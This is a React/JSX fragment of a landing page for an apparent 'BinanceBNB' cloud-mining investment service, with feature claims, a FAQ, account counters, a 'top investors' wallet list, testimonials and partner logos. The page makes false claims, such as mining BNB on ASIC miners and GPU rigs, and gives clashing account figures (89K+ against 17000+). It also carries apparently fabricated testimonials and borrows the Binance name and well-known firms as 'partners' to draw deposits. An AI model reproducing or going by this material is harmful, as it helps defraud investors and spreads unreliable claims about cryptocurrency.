                        <span className="section__cate">
                            Feature            </span>
                        <h3 className="section__title">Our Special Feature</h3>
                        <p>We unleash the full mining potential with clean energy.</p>
                    </div>
                    <div className="row g-4 justify-content-center">
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="headset" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">24/7 Support</h5>
                                        <p>
                                            Our team of experts always available and feels happy to help you 24/7. Feel free to reach us anytime.                            </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="mobile" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">Mobility</h5>
                                        <p>
                                            You can use whenever, just need access of the Internet and device. Our website is mobile friendly for mining process in mobile devices.                            
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="lock" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">Secure</h5>
                                        <p>
                                            The overwhelming majority of funds are stored in offline, cold wallets. McAfee® SECURE protection. Automatic backup of the database once a day.                            
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="burn" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">Clean Energy</h5>
                                        <p>
                                            We use more than 50%  green energy in our datacenters.                            
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="home" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">Direct deposit from mining pools</h5>
                                        <p>
                                            Direct deposit from top mining pools, safe and transparent assets                            
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6 col-lg-4">
                                <div className="feature__item">
                                    <div className="feature__icon">
                                        <FontAwesomeIcon icon="ethernet" className="fa_timer text-white"/>                        
                                    </div>
                                    <div className="feature__content">
                                        <h5 className="feature__title">Newest Hardware</h5>
                                        <p>
                                            We use The newest ASIC miner, GPU rigs. You get the most advanced technologies from Tesla For Doge.                            
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                </div>
            </section>
            <section className="faqs-section pt-120 pb-120" id="faq">
                <div className="container">
                    <div className="section__header section__header__center">
                        <span className="section__cate">
                            FAQ'S            
                        </span>
                        <h3 className="section__title">Frequently Asked Questions</h3>
                        <p>How can we help?</p>
                    </div>
                    <Accordion defaultActiveKey="0">
                        <Accordion.Item eventKey="0" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">How quickly does the deposit reaches on the balance?</h5></Accordion.Header>
                            <Accordion.Body className="faq__content">
                                <p>
                                    For enrollment of the deposits in BNB  you need to wait for the 1st confirmation in the network
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                        <Accordion.Item eventKey="1" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">What is the mininum for withdraw?</h5></Accordion.Header>
                            <Accordion.Body>
                                <p>
                                    Minimal amount for withdrawal is 0.05 BNB.
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                        <Accordion.Item eventKey="2" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">How can I buy BNB?</h5></Accordion.Header>
                            <Accordion.Body>
                                <p>
                                    Binance https://www.binance.com <br />

                                    Bittrex https://bittrex.com<br />

                                    Upbit https://upbit.com/home<br />

                                    Bitfinex https://www.bitfinex.com<br />

                                    HuobiPro https://www.huobipro.com<br />

                                    coinnest http://www.coinnest.co.kr<br />

                                    OKEX https://www.okex.cn<br />

                                    Gate.io https://gateio.io<br />

                                    CEX.COM http://cex.com<br />

                                    Liqui https://liqui.io<br />

                                    YoBit https://yobit.net<br />

                                    OTCBTC https://otcbtc.com<br />

                                    LBANK.info http://www.lbank.info<br />

                                    Bibox https://www.bibox.com<br />

                                    Bit-Z https://www.bit-z.com<br />

                                    COINEGG https://www.coinegg.com<br />

                                    Qryptos https://www.qryptos.com<br />

                                    COOLCOIN https://www.coolcoin.com<br />

                                    Gatecoin https://www.gatecoin.com<br />
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                        <Accordion.Item eventKey="3" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">What is the future of Binance coin?</h5></Accordion.Header>
                            <Accordion.Body>
                                <p>
                                    Binance Coin is one of the cryptocurrencies, which grew so fast, hence, there are many market enthusiasts, who are optimistic about the coin. On top of that, it is the world’s largest crypto exchange- Binance’s host coin.
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                        <Accordion.Item eventKey="4" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">How do I Start?</h5></Accordion.Header>
                            <Accordion.Body>
                                <p>
                                    Sign up providing your BNB wallet address and Start make future with BNB Cloud Mining.
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                        <Accordion.Item eventKey="5" className='py-4 px-4 mx-2 my-2'>
                            <Accordion.Header><h5 className="title">What is BNB?</h5></Accordion.Header>
                            <Accordion.Body>
                                <p>
                                    Binance Coin (BNB) is a cryptocurrency that can be used to trade and pay fees on the Binance cryptocurrency exchange.
                                </p>
                            </Accordion.Body>
                        </Accordion.Item>
                    </Accordion>
                </div>
            </section>
            <section className="counter-section bg--theme--overlay-2 bg_fixed top--wave-wrapper bottom--wave-wrapper pt-120 pb-120 bg_img" data-background="/public/assets/images/frontend/counter/61b9a40c86a161639556108.png">
                <div className='bg-image-overlay'></div>
                <div className="banner-shape">
                    <Image src={wave} alt="banner"/>
                </div>
                <div className="banner-shape-top">
                    <Image src={waverev} alt="banner"/>
                </div>
                <div className="container">
                    <div className="row g-4">
                            <div className="col-sm-6 col-lg-4">
                                <div className="counter__item">
                                    <div className="counter__header">
                                        <i className="las la-wallet"></i>                            
                                        <h3 className="title">
                                            <span className="rafcounter" data-counter-end="1000">{counter2}</span>
                                            <span>+ BNB</span>
                                        </h3>
                                    </div>
                                    <p>Mined</p>
                                </div>
                            </div>
                            <div className="col-sm-6 col-lg-4">
                                <div className="counter__item">
                                    <div className="counter__header">
                                        <i className="las la-user-alt"></i>                            
                                        <h3 className="title">
                                            <span className="rafcounter" data-counter-end="89">{counter1}</span>
                                            <span>K</span><span>+</span>
                                        </h3>
                                    </div>
                                    <p>Active accounts</p>
                                </div>
                            </div>
                            
                            <div className="col-sm-6 col-lg-4">
                                <div className="counter__item">
                                    <div className="counter__header">
                                        <i className="fas fa-building"></i>                            
                                        <h3 className="title">
                                            <span className="rafcounter" data-counter-end="6">{counter4}</span>
                                            <span>+</span>
                                        </h3>
                                    </div>
                                    <p>Mining Centers</p>
                                </div>
                            </div>
                        </div>
                </div>
            </section>
            <section className="investor-section pt-120 pb-120">
                <div className="container">
                    <div className="section__header section__header__center">
                        <span className="section__cate">
                            Investor            </span>
                        <h3 className="section__title">Our Top Investors</h3>
                        <p>We are managing 17000+ active  accounts for both individual and institutional investors.</p>
                    </div>
                    <div className="row g-4">
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0xd3f7d989edf39b...</h6>
                                        <span className="total__invest"><span className="text--success">125.18803775</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0x5aba2bbce1b489...</h6>
                                        <span className="total__invest"><span className="text--success">35.388938</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0xe36779a3f3521f...</h6>
                                        <span className="total__invest"><span className="text--success">15.74944737</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0x790893d8849f80...</h6>
                                        <span className="total__invest"><span className="text--success">9.17979476</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0xe2a57f007a74d5...</h6>
                                        <span className="total__invest"><span className="text--success">8.899</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                        
                            <div className="col-xl-4 col-md-6">
                                <div className="investor__item">

                                    <div className="investor__thumb">
                                        <Image src={investor} alt="investor"/>
                                    </div>

                                    <div className="investor__content">
                                        <h6 className="investor__title">0x9cae85aba53ec2...</h6>
                                        <span className="total__invest"><span className="text--success">8.172</span> BNB</span>
                                    </div>
                                </div>
                            </div>
                                </div>
                </div>
            </section>

            <section>
                <div className="row d-flex justify-content-center">
                    <div className="col-md-10 col-xl-8 text-center">
                    <h3 className="mb-4">Happy Miners</h3>
                    <p className="mb-4 pb-2 mb-md-5 pb-md-0">
                        See What Our Happy Miners Are Saying
                    </p>
                    </div>
                </div>

                <div className="row text-center mt-12 pt-8 py-8">
                    <div className="col-md-4 mb-5 mb-md-0">
                    <div className="d-flex justify-content-center mb-4">
                        <Image
                        src={client1}
                        className="rounded-circle shadow-1-strong"
                        width="150"
                        height="150"
                        alt=''
                        />
                    </div>
                    <h5 className="mb-3">Pete Shruden</h5>
                    <p className="px-xl-3">
                        <i className="fas fa-quote-left pe-2"></i>Have been mining BNB successfully on this platform for months. Very reliable BNB mining website
                    </p>
                    <ul className="list-unstyled d-flex justify-content-center mb-0">
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star-half-alt" className="fa_timer text-warning"/>
                        </li>
                    </ul>
                    </div>
                    <div className="col-md-4 mb-5 mb-md-0">
                    <div className="d-flex justify-content-center mb-4">
                        <Image
                        src={client2}
                        className="rounded-circle shadow-1-strong"
                        width="150"
                        height="150"
                        alt=''
                        />
                    </div>
                    <h5 className="mb-3">Maryan Brunnet</h5>
                    <p className="px-xl-3">
                        <i className="fas fa-quote-left pe-2"></i>Mining BNB has never been this easy, i am glad at the pace of my BNB mining process
                    </p>
                    <ul className="list-unstyled d-flex justify-content-center mb-0">
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                    </ul>
                    </div>
                    <div className="col-md-4 mb-0">
                    <div className="d-flex justify-content-center mb-4">
                        <Image
                        src={client3}
                        className="rounded-circle shadow-1-strong"
                        width="150"
                        height="150"
                        alt=''
                        />
                    </div>
                    <h5 className="mb-3">Dre Parker</h5>
                    <p className="px-xl-3">
                        <i className="fas fa-quote-left pe-2"></i> Thank you BinanceBNB
                    </p>
                    <ul className="list-unstyled d-flex justify-content-center mb-0">
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                        <li>
                            <FontAwesomeIcon icon="star" className="fa_timer text-warning"/>
                        </li>
                    </ul>
                    </div>
                </div>
            </section>
            <section className="stakeforms mx-auto justify-center" id="stakeMTD">
                {/* <div className="stake-bg-image"></div> */}
                <h1 className="header1 mx-auto justify-center">More Miners Testimonies</h1>
                
                <div className="gridcol">
                    <div className="formcon">
                        <div className="px-6 mx-auto text-center">
                            <div className="forma">
                                <Image src={testimony1} className="rounded" alt=''/>
                            </div>
                        </div>
                    </div>

                    <div className="formcon">
                        <div className="px-6 mx-auto text-center">
                            <div className="forma">
                                <Image src={testimony2} className="rounded" alt=''/>
                            </div>
                        </div>
                    </div>

                    <div className="formcon">
                        <div className="px-6 mx-auto text-center">
                            <div className="forma">
                                <Image src={testimony3} className="rounded" alt=''/>
                            </div>
                        </div>
                    </div>

                </div>
            </section>
            <div className="partners-section pt-120 pb-120">
                <div className="container">
                    <div className="section__header section__header__center">
                        <span className="section__cate">
                            Partners            
                        </span>
                        <h3 className="section__title">Our Partners</h3>
                        <p>Binancebnb with  Partners aim to Provide World-class Mining Experience to our users</p>
                    </div>
                    <div className='flex'>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://bitfury.com/" className="partner-thumb" passHref>
                                <Image src={partner1} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://pancakeswap.com/" className="partner-thumb" passHref>
                                <Image src={partner6} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://www.f2pool.com/" className="partner-thumb" passHref>
                                <Image src={partner2} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://www.huobi.com/" className="partner-thumb" passHref>
                                <Image src={partner3} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://www.coindesk.com/" className="partner-thumb" passHref>
                                <Image src={partner4} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                        <div className="col text-center animated" data-animation="fadeInUpShorter" data-animation-delay="0.3s">
                            <Link href="https://www.bitmain.com/" className="partner-thumb" passHref>
                                <Image src={partner5} width="120px" height="60px" alt="partner"/>
                            </Link>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
    </div>

    </div>

  )
}
